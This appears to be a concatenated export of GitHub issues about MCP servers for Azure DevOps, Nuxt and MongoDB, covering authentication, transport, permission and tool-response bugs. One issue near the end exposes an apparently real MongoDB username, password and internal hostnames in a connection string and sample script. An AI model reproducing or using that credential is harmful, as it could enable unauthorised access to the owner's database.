- Support for HTTP server with SSE endpoints  
- Configurable transport type (stdio vs SSE)  
- Maintain backward compatibility with existing stdio clients  
  
### Use Case  
This would enable using the Azure DevOps MCP Server in web-based AI interfaces that don't support stdio transport.  
  
### Azure DevOps REST API Reference  
The server would continue to use the existing Azure DevOps REST APIs, only changing the transport layer for client communication."

Hi 👋,

First off, thank you for your work on this project — it's been incredibly useful!

I’d like to request that nightly or weekly builds be published to npm, possibly using tags like `next`, `canary`, or `nightly`.

### **Why This Is Important**

There have been **many code changes** and **fixes** since the last official release. Some of these are critical bugfixes and paper cut improvements that would be highly valuable to downstream users. Publishing more frequent builds would:

* Enable early access to these improvements
* Let users test and provide feedback before stable releases
* Improve confidence in future releases via incremental adoption

Current Implementation only supports AZ CLI. In our set up we have some restriction on AZ CLI set up and installation locally which restricts the use of this MCP. This is a great tool, and we want to use it. 

# Enhancement
Add PAT based authentication.

First off, thank you for this excellent MCP Server. I was able to run it in Copilot without any problems.

However, I'm encountering an issue with the MCP Server when using it via the gemini-cli. Initially, it indicates a successful load, but when I attempt to use it, it throws the following error:

I tried to clone the repo to run it locally, but I was unable to get it to load correctly in the Gemini CLI 

Any help you could provide to resolve this would be greatly appreciated. Thanks again for your time and for this great tool.

I already have it working in a local azure function since AZURE_TOKEN_CREDENTIALS = ""dev"" allows it to use my local credential for ado.

I would like to be able to use a pat token for prototyping in the cloud and then also a managed identity once i'm ready to deploy it permanently, using an identity with federated credentials connected to an Identity in our ADO instance.

The additional benefit of testing with an ADO pat token is you have explicit control over the permissions allowed on the token, so i can restrict it to just having get build and get release , so if i give an inaccurate prompt it doesnt end up being able to start a release or do something else just because my logged in Azure CLI credential has ability to do everything."

Do I get this error because I got not enough permission in organization or something else?
By the way I can use PAT in my azure devops  organize(on-cloud) to use mcp from https://github.com/Tiberriver256/mcp-server-azure-devops
Will PAT be also supported further ?

Note that other mcp servers set up on gemini-cli (e.g. perplexity) work just fine, but with this mcp server added to the config of gemini-cli nothing works. We always get these errors for any prompt:

 _Originally posted by @sheldonhull in [#62](https://github.com/microsoft/azure-devops-mcp/issues/62#issuecomment-3006199165)_

I'm finding this is still an issue. 
I've been trying to use Entra token based auth wherever I can, but having difficulty getting this to work with the MCP server.
I believe creating a long lived token and doing the az devops login would work, but I'm trying to make sure it uses the short lived token. 

I provided [example](https://github.com/microsoft/azure-devops-mcp/discussions/89#discussioncomment-13578394) of what I've done to try and force this in the session with `AZURE_DEVOPS_EXT_PAT` and `get-access-token` but still no success.

Any ideas?"

# Summary
Implement tools for TFS (Team Foundation Server). There is an existing [ChangeSets Api](https://learn.microsoft.com/en-us/rest/api/azure/devops/tfvc/changesets?view=azure-devops-rest-7.1) you can use. Unfortunately, we still have quite a bit of code that is in TFS, and it is helpful to be able to interact with it using MCP/CoPilot.

# Tools

Some tools that would be helpful are:
  tfvc_list_changesets - [get a list of changesets](https://learn.microsoft.com/en-us/rest/api/azure/devops/tfvc/changesets/get-changesets?view=azure-devops-rest-7.1&tabs=HTTP)
  tfvc_get_changeset - [get a single changeset](https://learn.microsoft.com/en-us/rest/api/azure/devops/tfvc/changesets/get?view=azure-devops-rest-7.1&tabs=HTTP)
  tfvc_get_changeset_changes - [get description of changes in changeset](learn.microsoft.com/en-us/rest/api/azure/devops/tfvc/changesets/get-changeset-changes?view=azure-devops-rest-7.1&tabs=HTTP)
  tfvc_get_item_content - [download a file from TFS](https://learn.microsoft.com/en-us/rest/api/azure/devops/tfvc/items/get?view=azure-devops-rest-7.1&tabs=HTTP)
  tfvc_diff_file_versions - (optinal) diff two versions of a file to be able to see what changed


# Code

I added the tools described above on this branch: https://github.com/hdoupe/azure-devops-mcp/tree/tfs-support. I used the new tools to summarize the changes in a list of tickets and it worked pretty well! If you are interested in these changes, I'd be happy to open a PR with them. Or, you can take them and handle it internally."
microsoft/azure-devops-mcp,3154128268,73,`search_wiki` output is not valid for `wiki_get_page_content`,closed,2025-06-17T16:43:23Z,2025-06-30T03:38:37Z,[],emaf,"When searching for a wiki page to then retrieve its content, the path returned by `search_wiki` is not in the format expected by `wiki_get_page_content` (or the underlaying ado api).

### Repro steps
Asking copilot something like ""Bring the content of the `My wiki` wiki page"" will execute the folowing:
1. `search_wiki` 
    - **Input**
       ```
        {
          ""searchRequest"": {
            ""searchText"": ""Visual Studio Development"",
            ""filters"": {
              ""Project"": [
                ""DevDiv""
              ]
            },
            ""includeFacets"": false
          }
        }
        ```
   - **Output**
       ```
        {
          ""count"":1193,
          ""results"":[{
            ""fileName"":""My-wiki.md"",
            ""path"":""/My-wiki.md"",
        ...
        ```
2. Run `wiki_get_page_content`
    - **Input**
       ```
       {
            ""path"": ""/My-wiki.md"",
            ""project"": ""Contoso"",
            ""wikiIdentifier"": <GUID>
       }
        ```
   - **Output**
       ```
        {\""$id\"":\""1\"",\""innerException\"":null,\""message\"":\""Wiki page ‘/My-wiki.md’ could not be found. Ensure that the path of the page is correct and the page exists.\"",\""typeName\"":\""Microsoft.TeamFoundation.Wiki.Server.WikiPageNotFoundException, Microsoft.TeamFoundation.Wiki.Server\"",\""typeKey\"":\""WikiPageNotFoundException\"",\""errorCode\"":0,\""eventId\"":3000}""
        ...
        ```

### Workaround
Instruct Copilot or add to the `copilot-instructions.md` something like: 
```
- When trying to get a wiki page content, do not use dashes or the `.md` extension anywhere in the path. Replace dashes with spaces in the entire path, but keep the `/` as a separator.
```

`wiki_get_page_content` works with path `/My wiki`."

microsoft/azure-devops-mcp,3115081708,19,Feature Request: Add option to retrieve full work item details in my_work_items tool,closed,2025-06-03T18:51:48Z,2025-06-11T14:18:03Z,[],aguywithcode,"## Description
The current implementation of the `my_work_items` tool in the Azure DevOps MCP integration requires two MCP calls to get complete work item information:
1. First call gets work item IDs from query results
2. Second call retrieves full work item details using those IDs

This requires the extra step of processing the IDs and making an additional MCP request.

## Feature Request
Add a new optional boolean parameter (e.g., `includeDetails`) to the `my_work_items` tool that would:
- When `false` (default): Keep the current behavior
- When `true`: Return the complete work item details directly without requiring a separate call to `get_work_items_batch_by_ids`

## Current Code
```typescript
server.tool(
  WORKITEM_TOOLS.my_work_items,
  ""Get a list of work items relevant to me."",
  {
    projectId: z.string(),
    type: z.enum([""assignedtome"", ""myactivity""]).default(""assignedtome""),
    top: z.number().default(50),
    includeCompleted: z.boolean().default(false),
  },
  async ({ projectId, type, top, includeCompleted }) => {
    const connection = await connectionProvider();
    const workApi = await connection.getWorkApi();
    const workItemApi = await connection.getWorkItemTrackingApi();

    const query= await workApi.getPredefinedQueryResults(
      projectId,
      type,
      top,
      includeCompleted
    );

    return {
      content: [{ type: ""text"", text: JSON.stringify(query, null, 2) }],
    };
  }
);
```

##Proposed Change
```typescript
server.tool(
  WORKITEM_TOOLS.my_work_items,
  ""Get a list of work items relevant to me."",
  {
    projectId: z.string(),
    type: z.enum([""assignedtome"", ""myactivity""]).default(""assignedtome""),
    top: z.number().default(50),
    includeCompleted: z.boolean().default(false),
    includeDetails: z.boolean().default(true), // Added parameter
  },
  async ({ projectId, type, top, includeCompleted, includeDetails }) => {
    const connection = await connectionProvider();
    const workApi = await connection.getWorkApi();
    const workItemApi = await connection.getWorkItemTrackingApi();

    const query= await workApi.getPredefinedQueryResults(
      projectId,
      type,
      top,
      includeCompleted
    );
    
    
    // If includeDetails is false, just return the original query results
    if (!includeDetails) {
      return {
        content: [{ type: ""text"", text: JSON.stringify({ query }, null, 2) }],
      };
    }
    
    // Otherwise, get the full work item details (current behavior)
    const workItemIds = query.results?.map(item => item.id).filter(id => id !== undefined) || [];
    const workItems = await workItemApi.getWorkItemsBatch(
      { ids: workItemIds },

antfu/nuxt-mcp,3447661492,31,MCP json file over-written with a new nuxt mcp object when multiple Nuxt servers are started in a monorepo setup,open,2025-09-24T05:01:33Z,2025-09-24T05:01:33Z,[],ananthachetan,"### Describe the bug

Issue:

I have a monorepo setup that has multiple Nuxt apps. When I start multiple apps each app updates the mcp.json inside Cursor and VSCode folders which a single nuxt MCP object overwriting the previous update done by the other app.

Solution:

If we can have an option to disable the config write that happens when the app starts then we can manually update the mcp json with different nuxt mcp configs (app based)

Current Workaround:

I have manually created different configs in the mcp.json file and whenever another entry gets added when I start an app I delete it:

`    ""mcpServers"": {
        ""nuxt-docs"": {
            ""url"": ""https://mcp.nuxt.com/sse""
        },
        ""nuxt-sc-base"": {
            ""url"": ""http://localhost:9443/__mcp/sse""
        },
        ""nuxt-sc-cdec"": {
            ""url"": ""http://localhost:9444/__mcp/sse""
        },
        ""nuxt-sc-cti"": {
            ""url"": ""http://localhost:9445/__mcp/sse""
        }
   }`

I delete the following config that gets added when the app starts
`""nuxt"": {
            ""url"": ""http://localhost:9443/__mcp/sse""
        }`

### Reproduction

Start multiple nuxt apps in a monorepo and observe only one entry of ""nuxt"" mcp is created in the mcp.json with the config of the latest app that was started

Would it be possible to support something like Vite's [`logLevel`](https://vite.dev/config/shared-options#loglevel) option to allow users to adjust the verbosity of console output?

Background: I'm using vite-plugin-mcp to build a library called [astro-mcp](https://github.com/morinokami/astro-mcp), and I'd like to align its output style with that of other Astro integrations. Being able to control the verbosity would help achieve this."

It takes only a few minutes to fix this:

1. Go to your server's listing: [antfu/nuxt-mcp](https://glama.ai/mcp/servers/antfu/nuxt-mcp)
2. Click ""Claim"" to verify ownership.
3. Once claimed, navigate to the [admin `Dockerfile` page](https://glama.ai/mcp/servers/antfu/nuxt-mcp/admin/dockerfile) and add a `Dockerfile`.
4. Ensure your server passes all the [checks](https://glama.ai/mcp/servers/antfu/nuxt-mcp/score).

Once completed, your server will be available for anyone to use.

I tried using vite-plugin-mcp alone, and the server worked correctly, but when the agent used tools, an error occurred: ""Cannot convert undefined or null to object"". I looked at the source code and think [this](https://github.com/antfu/nuxt-mcp/blob/main/packages/vite-plugin-mcp/src/server.ts#L30) is where the problem is. After checking the [documentation](https://vite.dev/guide/api-javascript.html#vitedevserver), I found that `vitedevserver` does not have an `environments` property. If I have missed any key operations, please let me know. Thank you.

When using the MCP server with HTTP transport behind an Nginx reverse proxy, the Open AI agent builder can detect the server and list available tools. However, tool calls fail most of the time (>90%), returning:

```
Tool: mcp_mongo.connect
Response: { ""code"": 32600, ""message"": ""Session terminated"" }
```

**Expected behavior:**
Tool calls should consistently succeed once the MCP server is reachable.

**Observed behavior:**
Most requests to `/mcp` end with a `Session terminated` error, even though initial handshake and occasional tool calls succeed.

**Condensed Server Log:**

```
nginx | ""POST /mcp"" 200 / 202 responses alternating
mongo-mcp | [INFO] Server started (StreamableHTTPServerTransport)
mongo-mcp | [INFO] Attempting MongoDB connection...
mongo-mcp | [DEBUG] Telemetry: start → stop sequence repeats within seconds
mongo-mcp | [INFO] Server shutdown / ""Session terminated""
```

* Repeated server restarts and session closures observed within 1–2 seconds.
* Same behavior across multiple session IDs.
* Nginx reverse proxy appears to receive valid POST/DELETE cycles but connections terminate immediately after.

mongodb-js/mongodb-mcp-server,3460305351,597,Feature Request: Support for Creating a MongoDB Query Language Agent via MongoDB-MCP Server,closed,2025-09-27T13:13:18Z,2025-10-07T12:27:06Z,[],AryanKarumuri,"**Summary:**
Enable the creation of a MongoDB Query Language Agent using MongoDB-MCP_Server, allowing users to dynamically generate and execute MongoDB queries through a natural language input.

**Motivation:**
An MQL Agent would simplify this process by abstracting query construction and execution behind a consistent interface — especially valuable when paired with LLMs or other language-based systems.

By leveraging `mongodb-mcp_server`, the agent can securely and efficiently interface with MongoDB instances in managed environments, following best practices for access control and scalability.

**Key Features:**

- Interpret structured or natural language inputs into valid MongoDB queries (MQL).
- Execute queries via MongoDB-MCP_Server with secure connection handling.
- Support for standard CRUD operations and aggregation pipelines.
- Integration with LLMs for natural language to MQL translation.
- Validation and error handling for safe query generation.


**Tools used for MQL Agent Development:**
Below are the custom tools created for the Agent:-

1. get_collection - Fetches all collections in the database.
2. get_schema - Retrieves the schema for each collection to guide query formation.
3. get_aggregate_query - Generates an aggregation pipeline based on the collection’s schema.
4. execute_query - Executes the final MQL generated by the LLM (e.g., coder models like Qwen or DeepSeek).


**Feedback & Observations:**

I experimented with the existing mql-agent from MongoDB. While it worked well for smaller datasets (5–10 collections), I found that accuracy degraded significantly when scaling to 150–200 collections, which is my typical use case. The generated queries became inconsistent or incomplete, likely due to the increased schema complexity.

I've also explored integrating open-source LLMs (such as Qwen-14B-Coder and DeepSeek-Coder) to maintain data privacy and confidentiality. However, the results were not consistently accurate or production-ready.


**Request for Input:**

I'd appreciate guidance or best practices on the following:

1. How to efficiently scale MQL generation across larger schemas (150–200 collections) using mongodb-mcp_server?
2. Recommendations for integrating open-source LLMs (e.g., Qwen-14B-Coder, DeepSeek-Coder) with mongodb-mcp_server to improve MQL generation accuracy while keeping data private? 
3. How to best utilize `mongodb-mcp_server` for my use case, including architecture suggestions, API usage patterns, or example workflows that would help handle large-scale collection structures effectively?

* Are the permissions and their scopes correct?
* Are any permissions missing?
* Do any permissions need to be runtime-scoped (e.g., a specific project directory) rather than global?

**Proposed manifest (please review)**

mongodb-js/mongodb-mcp-server,3362220409,485,[Bug]: MongoDB MCP Server fails to connect to Claude Code - immediate shutdown after startup,closed,2025-08-28T07:44:18Z,2025-08-28T13:23:04Z,[],pranav-iihglobal,"## Bug Description

The MongoDB MCP Server (v0.2.0) fails to connect to Claude Code due to two critical issues that cause immediate server shutdown and connection failures.

### Steps to Reproduce

1. Configure MongoDB MCP server in Claude Code's `.mcp.json`:
```json
{
  ""mongodb"": {
    ""command"": ""npx"",
    ""args"": [""-y"", ""mongodb-mcp-server""],
    ""env"": {
      ""MDB_MCP_CONNECTION_STRING"": ""mongodb+srv://user:pass@cluster.mongodb.net/database?retryWrites=true&w=majority""
    }
  }
}
```

2. Run `claude mcp list` to check server connections
3. Observe that MongoDB server does not appear in connected servers list

### Expected Behavior

- MongoDB MCP server should appear as ""✓ Connected"" in the server list
- Server should remain running and available for MCP operations

### Actual Behavior

- Server starts but immediately terminates with ""Server close requested"" message
- Claude Code health check fails and excludes server from connected list
- Manual testing shows server outputs logging capability warnings then closes

### Environment

- **Version**: 0.2.0
- **App**: Claude Code (Claude Desktop CLI)
- **Node.js**: v22.16.0
- **OS**: Linux 6.14.0-28-generic
- **MongoDB**: Atlas connection (tested and working independently)

### Technical Analysis

**Root Causes Identified:**

1. **Logging Capability Issue** (Related to Issue #454):
   - Server declares `logging: {}` capability in `src/server.ts` line ~51
   - Does not implement required `logging/setLevel` method
   - Causes MCP clients to mark connection as failed

2. **Immediate Shutdown Issue**:
   - Server sends ""Server close requested"" notification immediately after startup
   - Prevents Claude Code from maintaining persistent connection

### Evidence

Manual server test shows immediate termination:
```bash
$ npx -y mongodb-mcp-server --connectionString ""mongodb+srv://...""
[DEBUG] tool: Prevented registration of connect because read-only mode is enabled...
[DEBUG] tool: Prevented registration of create-index because read-only mode is enabled...
# ... more debug messages ...
{""method"":""notifications/message"",""params"":{""level"":""info"",""data"":""[server]: Server close requested""},""jsonrpc"":""2.0""}
{""method"":""notifications/message"",""params"":{""level"":""debug"",""data"":""[telemetry]: Attempting to send 0 events (0 cached)""},""jsonrpc"":""2.0""}
```

The server starts successfully but immediately requests to close, making it impossible for MCP clients to maintain a connection.

### Impact

- **Complete inability** to use MongoDB MCP server with Claude Code
- Affects all Claude Code users trying to integrate MongoDB functionality
- Forces users to seek alternative solutions or third-party implementations
- Makes the official MongoDB MCP server unusable with a major MCP client

### Suggested Fix

1. **Remove logging capability declaration**: Remove `logging: {}` from the `registerCapabilities` method until proper logging implementation is added
2. **Fix immediate shutdown**: Investigate and resolve why server sends close request immediately after startup
3. **Add proper health check handling**: Ensure server responds correctly to MCP client health checks

### Workaround

Currently, no workaround exists. The MongoDB connection string works fine with direct MongoDB driver connections, but the MCP server implementation prevents usage through the MCP protocol.

This bug makes the official MongoDB MCP server completely unusable with Claude Code and requires urgent attention."

### Bug Description

The MongoDB MCP Server incorrectly declares logging capability without implementing the required logging functionality, causing connection errors in MCP clients like the MCP Inspector.

Original issue: https://github.com/modelcontextprotocol/inspector/issues/670

Problem

Current behavior:
- MongoDB MCP Server declares ""logging"": {} capability in initialization response
- Server does NOT implement logging/setLevel method
- Server does NOT emit notifications/message log notifications
- MCP Inspector attempts to call logging/setLevel based on declared capability
- Server returns MethodNotFound error
- Inspector shows connection as ""failed"" despite successful connection

Expected behavior:
- Server should only declare capabilities it actually implements
- Connection should show as successful when server is working properly

Root Cause

File: src/server.ts:51
```
// ❌ INCORRECT - declares logging capability without implementing it
this.mcpServer.server.registerCapabilities({
  logging: {}, // Should not be declared
  resources: { listChanged: true, subscribe: true }
});
```

Proposed Fix

Remove the logging: {} capability declaration:

```
// ✅ CORRECT - only declare implemented capabilities
this.mcpServer.server.registerCapabilities({
  resources: { listChanged: true, subscribe: true }
});
```"

mongodb-js/mongodb-mcp-server,3286532248,416,Add Concrete Gateway Examples to Security Documentation,closed,2025-08-03T00:12:19Z,2025-08-19T16:50:46Z,[],nickytonline,"Hey there!

For context, I just read [this great piece from your team on The New Stack](https://thenewstack.io/agents-meet-databases-the-future-of-agentic-architectures/).

The current security guidance in the repo consists of a brief warning under ""Option 6: Running as an HTTP Server"" with a few bullet points of high-level advice like ""implement authentication (e.g., API gateway, reverse proxy)"" and ""never expose directly to the internet."" While this guidance is solid, it doesn't show users what these recommendations actually look like in practice.

The [MCP security best practices](https://modelcontextprotocol.io/specification/draft/basic/security_best_practices) specifically discuss ""MCP Proxy Server"" architectures and emphasize proper authentication controls, while multiple security analyses recommend ""Consider an MCP gateway: Centralizing MCP Server usage through a proxy will allow a single point of control for audit logging and monitoring, as well as guardrails and governance controls."" This would just be showing users how to implement that guidance with concrete examples.

How about adding a ""Gateway Examples"" section that shows specific implementations? This would make the existing guidance way more actionable for users.

Here's what this could look like:


### Gateways

**Pomerium (Open Core)**
- Identity-aware proxy specifically designed for zero-trust access
- Has [dedicated MCP documentation](https://www.pomerium.com/docs/capabilities/mcp)
- Supports all major identity providers (Azure AD, Google, Okta, etc.)
- Example configuration:

```yaml
routes:
  - from: https://mongodb-mcp.your-domain.com
    to: http://localhost:3000
    name: MongoDB MCP Server
    mcp:
      server: {} # the brackets are significant, they indicate that this is an MCP server route
    policy:
      and:
        - domain:
            is: company.com
        - mcp_tool:
            starts_with: 'read_'
```

This section could be expanded with additional gateway solutions as the community contributes examples:
- Google Cloud Identity-Aware Proxy
- AWS Application Load Balancer with authentication  
- Cloudflare Access
- Other reverse proxy solutions with authentication

## Why This Helps

1. **Makes existing guidance actionable** - users get concrete examples instead of just ""use a gateway""
2. **Addresses AI agent risks** - IAPs are particularly good at the continuous verification that agents need
3. **Open ecosystem** - creates a structure where the community can contribute other gateway examples
4. **Builds on MCP momentum** - leverages the fact that both MCP and many gateway solutions are open source

I'd be happy to put up a PR for this to get the ball rolling, if this sounds useful. The goal would be creating something that's immediately helpful but also easy for others to extend with additional gateway options."

mongodb-js/mongodb-mcp-server,3255105971,391,[Bug]: MCP error -32602: Invalid arguments for tool...,closed,2025-07-23T06:44:09Z,2025-07-24T09:58:34Z,[],jleonelion,"### Version

About two weeks ago, I configured my Claude Desktop to use the Mongo MCP (via Docker) and it's been working great!

At some point in the last day or two, this setup started having problems and now fails regularly.  I didn't change any of my configuration files but I suspect auto-updates may have crept in.  It looks like Claude is not sending the necessary arguments when making tool calls, resulting in logs like:
```
025-07-23T06:11:18.838Z [collectibles-mongodb] [info] Message from client: {""method"":""tools/call"",""params"":{""name"":""list-collections""},""jsonrpc"":""2.0"",""id"":5} { metadata: undefined }
2025-07-23T06:11:18.842Z [collectibles-mongodb] [info] Message from server: {""jsonrpc"":""2.0"",""id"":5,""error"":{""code"":-32602,""message"":""MCP error -32602: Invalid arguments for tool list-collections: [\n  {\n    \""code\"": \""invalid_type\"",\n    \""expected\"": \""string\"",\n    \""received\"": \""undefined\"",\n    \""path\"": [\n      \""database\""\n    ],\n    \""message\"": \""Required\""\n  }\n]""}} { metadata: undefined }
```
I initially thought the problem was related to updates in the ""latest"" version of the docker image hosting the MCP server.  After trying older versions of the image (ex. mongodb/mongodb-mcp-server:0.1.3-2025-07-09) the problem persists.  

I also tried using different models (ex. Claude Sonnet 4, Claude Sonnet 3.7, Claude Haiku 3.5) and I continue to see regular errors.

* `list-databases` works consistently (but that has not arguments)
* `list-collections` works most of the time, but it does fail (see logs above)
* `count` intermittently fails
* `find` frequently fails 

I haven't exercised every tool, but I think you get the point.  The difficult thing to nail down is this doesn't happen every time, but it does happen frequently enough to make it unusable.

What could be causing this?

# MongoDB MCP Server - Atlas API Permission Issue

## Bug Summary
The MongoDB MCP server fails to connect to Atlas clusters and read data when using Atlas API with ""read-only"" permissions, requiring full ""Project Owner"" permissions to function properly. This contradicts the expected behavior for read-only operations.

## Environment
- **MCP Server**: `mongodb-mcp-server` (latest via npx)
- **MongoDB Atlas**: Cluster on Atlas (M50 tier)
- **MCP Configuration**: Using Atlas API credentials with `--readOnly` flag
- **Connection Method**: Atlas API (not direct connection string)

## Expected Behavior
The MCP server should be able to:
1. Connect to Atlas clusters
2. List databases
3. List collections
4. Read data from collections

When configured with minimal read permissions such as:
- `Project Read Only`
- `Project Data Access Read Only`

## Actual Behavior
The MCP server fails with authentication errors when using read-only permissions and only works with full `Project Owner` permissions.

## Detailed Test Results

### Working Configuration (Project Owner)
```json
{
  ""mcpServers"": {
    ""MongoDB"": {
      ""command"": ""npx"",
      ""args"": [
        ""-y"", ""mongodb-mcp-server"",
        ""--apiClientId"", ""mdb_sa_id_xxx"",
        ""--apiClientSecret"", ""mdb_sa_sk_xxx"",
        ""--readOnly""
      ]
    }
  }
}
```

**Permissions**: Project Owner
**Result**: All operations work (connect, list databases, list collections)

### ❌ Failing Configurations

#### Configuration 1: Minimal Read Permissions
**Permissions**: 
- Project Read Only
- Project Data Access Read Only

**Result**: 
- ✅ `atlas-list-clusters` works
- ❌ `atlas-connect-cluster` fails with `401 Unauthorized`

#### Configuration 2: Extended Read Permissions
**Permissions**:
- Project Read Only
- Project Data Access Read Only
- Project Observability Viewer
- Project Cluster Manager

**Result**: Same as Configuration 1

#### Configuration 3: Admin Permissions (Without Owner)
**Permissions**:
- Project Data Access Admin
- Project Cluster Manager
- Project Database Access Admin
- Project Data Access Read Only
- Project Observability Viewer
- Project Read Only

**Result**:
- ✅ `atlas-connect-cluster` works
- ❌ `list-databases` fails with ""Authentication failed""
- ✅ `list-collections` works for specific databases

## Error Messages

### Connection Error (Insufficient Permissions)
```
Unable to authenticate with MongoDB Atlas, API error: [401 Unauthorized] 
error calling Atlas API: Unauthorized; Current user is not authorized to perform this action.
```

### Database Listing Error (Even with Data Access Admin)
```
Error running list-databases: Authentication failed.
```

## Analysis
1. **Atlas API metadata operations** (list-clusters, list-users, etc.) work with basic read permissions
2. **Atlas cluster connection** requires `Project Data Access Admin` (not just Read Only)
3. **Database listing** fails even with `Project Data Access Admin`
4. **Collection listing** works when database name is specified
5. Only **Project Owner** enables full functionality


## Impact
- Users cannot use least-privilege access principles
- Requires unnecessarily broad permissions for read-only operations
- Security concern for production environments
- Contradicts MongoDB Atlas best practices for API access

## Reproduction Steps
1. Create Atlas API key with `Project Read Only` + `Project Data Access Read Only` permissions
2. Configure MCP server with `--readOnly` flag
3. Attempt to connect and list data
4. Observe authentication failures
5. Upgrade to `Project Owner` permissions
6. Observe that everything works

## Additional Context
This issue was discovered during systematic permission testing where we incrementally tested different Atlas API permission combinations to find the minimum required access level."

When using `find`, always pass the `filter` argument.

That sounds like a repeatable error (bad credentials possibly?), but if you run it 3 (or 5!?) more times it eventually connects with zero changes other than retrying.

Can you either enhance the error messaging with timeout information (this feels like a 15 sec timeout problem) or other causes of failure if you can't determine that the credentials are, in fact, incorrect?

Instructions to the LLM can work-around the issue, but it feels dumb telling it to just manually retry 5 or 6 times ignoring the error message to actually connect.

Our situation is a project with multiple clusters, so a connectionString auth isn't possible. We are using a Project-level Application (clientId, clientSecret) to auth.

### Bug Description

## Summary
The `mongo-mcp` server returns tool responses in a format that is incompatible with the MCP SDK's expected `CallToolResult` schema, causing a Pydantic validation error when trying to use the server with standard MCP clients.

## Environment
- **MCP SDK Version**: Latest (as of June 2024)
- **mongo-mcp Version**: Latest from npx
- **Python Version**: 3.x
- **Platform**: Windows/Linux/MacOS

## Steps to Reproduce

1. Set up a MongoDB connection (local or Atlas)
2. Create an MCP client configuration:
```json
{
  ""mcpServers"": {
    ""mongodb"": {
      ""command"": ""npx"",
      ""args"": [
        ""mongo-mcp"",
        ""mongodb+srv://user:pass@cluster.mongodb.net/database""
      ]
    }
  }
}
```

3. Use any MCP SDK-based client to connect and call a tool:
```python
from mcp import ClientSession
# ... setup code ...
result = await session.call_tool(""listCollections"", {})
```

## Expected Behavior
The tool call should return a valid `CallToolResult` object that the MCP SDK can process.

## Actual Behavior
The call fails with a Pydantic validation error:

```
pydantic_core._pydantic_core.ValidationError: 1 validation error for CallToolResult
content
  Field required [type=missing, input_value={'toolResult': {'content'...]'}], 'isError': False}}, input_type=dict]
```

## Root Cause Analysis

The `mongo-mcp` server returns responses in this format:
```json
{
  ""result"": {
    ""toolResult"": {
      ""content"": ""actual content here""
    },
    ""isError"": false
  }
}
```

But the MCP SDK expects this format:
```json
{
  ""content"": [
    {
      ""type"": ""text"",
      ""text"": ""actual content here""
    }
  ]
}
```

## Debug Logs

From client debug output:
```
2025-06-24 00:02:52,339 - __main__ - ERROR - Error calling tool find: 1 validation error for CallToolResult
content
  Field required [type=missing, input_value={'toolResult': {'content'...]'}], 'isError': False}}, input_type=dict]
```

## Workaround

Currently, the only workaround is to create a patched client session that intercepts and transforms the response:

```python
class PatchedClientSession(ClientSession):
    async def call_tool(self, name: str, arguments: Dict[str, Any] = {}) -> CallToolResult:
        request = CallToolRequest(
            method=""tools/call"",
            params={""name"": name, ""arguments"": arguments}
        )
        
        response = await self._send_request(request)
        
        # Transform mongo-mcp response to MCP SDK format
        if isinstance(response, dict) and 'result' in response:
            result_data = response['result']
            if 'toolResult' in result_data:
                content = result_data['toolResult'].get('content', '')
                return CallToolResult(content=[{""type"": ""text"", ""text"": content}])
        
        # Fallback
        return CallToolResult(content=[{""type"": ""text"", ""text"": str(response)}])
```

## Proposed Solutions

1. **Update mongo-mcp server** to return responses in the MCP SDK's expected format
2. **Add compatibility layer** in the MCP SDK to handle different response formats
3. **Document the expected response format** clearly in the MCP specification

## Impact
This issue prevents any MCP SDK-based client from working with the `mongo-mcp` server, affecting all users trying to integrate MongoDB with MCP-compatible applications.

## Additional Context
- The issue affects all tool calls (listCollections, find, insertOne, etc.)
- Other MCP servers (like `mongodb-mcp-server`) may use the correct format
- This appears to be a protocol mismatch rather than a bug in either component

As I started the docker container I specified the ports to be 9091:8080 so now my MCP server is available at http://localhost:9091. But I have tried every possible way to connect to it, but I cannot figure out how I can, i remotely connect to this local MCP server from a local client.

I even tried to connect using MCP Inspector using http protocol but still got the following error:

Is there a default port?

OS: Windows
Node.js version: 22.14.0
MCP server version: (latest and 0.1.0, both tried)
Shells tried: PowerShell, Command Prompt
Issue: When I run the MCP server with either a MongoDB Atlas connection string or a non-Atlas (replica set) connection string, the process hangs indefinitely with no output. This happens in both PowerShell and Command Prompt.

Commands tried:
mongodb-mcp-server --connectionString ""mongodb+srv://inSightUser:pwd@notifynow-dev1-pl-1-eastus2.2bk3g.mongodb.net/?retryWrites=true&w=majority""
mongodb-mcp-server --connectionString ""mongodb://crudDbUser:pwd@zlp33045.vci.att.com:13720,zlp33051.vci.att.com:13720,zlp33066.vci.att.com:13720/crudDb?authSource=crudDb&replicaSet=rs-MS_PROD""

lso tried with npx and with --telemetry disabled and specifying --logPath.

What works: Direct Node.js scripts using the same connection strings connect and list databases successfully. Example:
const { MongoClient } = require(""mongodb"");
const uri = ""mongodb://crudDbUser:msNov_1711@zlp33045.vci.att.com:13720,zlp33051.vci.att.com:13720,zlp33066.vci.att.com:13720/crudDb?authSource=crudDb&replicaSet=rs-MS_PROD"";
const client = new MongoClient(uri);
async function run() {
  try {
    await client.connect();
    const dbs = await client.db().admin().listDatabases();
    console.log(""Databases:"", dbs);
  } catch (e) {
    console.error(e);
  } finally {
    await client.close();
  }
}
run();

This script returns a full list of databases for both Atlas and non-Atlas connections.

What doesn't work:

MCP server hangs with no output, no errors, and nothing in the logs.
Tried latest and 0.1.0 versions, both globally and with npx.
Tried disabling telemetry and specifying logPath.

### Bug Description

Title:
ObjectId query syntax fails in MCP tools with ""unknown operator: $oid"" error
Description:
Problem
When attempting to query documents using ObjectId references in MongoDB MCP tools, queries consistently fail with the error ""unknown operator: $oid"". This occurs when using standard MongoDB syntax for querying by ObjectId.
Steps to reproduce
Attempt to query a collection using the MCP MongoDB tools
Use a filter containing an ObjectId reference with standard syntax:
Apply to mcp.json
}
Observe the error: ""Error running find: unknown operator: $oid""
Failed queries
The following query patterns all produce the same error:
{""_id"": {""$oid"": ""...""}}
{""userId"": {""$oid"": """"...""}}
{""_id"": {""$eq"": {""$oid"": """"...""}}}
Using the string format without $oid operator does not retrieve documents:
{""_id"": """"...""}
Expected behavior
The MCP tools should properly translate the ObjectId query syntax to the appropriate MongoDB query, allowing users to query documents by their ObjectId fields using standard MongoDB syntax.
Environment
MCP tools in Cursor/AI assistance environment
Querying a MongoDB database with collections containing ObjectId fields
Impact
This issue significantly impacts the ability to query documents by their IDs, which is a fundamental operation when working with MongoDB.

### Bug Description

Hello Team,

We've tried to use all the tools built. The `count` tool is not working as the `find`. With the tool of find, we are able to extract the information, but the count is always returning the complete number of records from the collection. Please verify this & share me if anyone else is facing the same issue. 

Note: Tried with all different kinds of prompting & the proof is that find is working well.

Thank You."

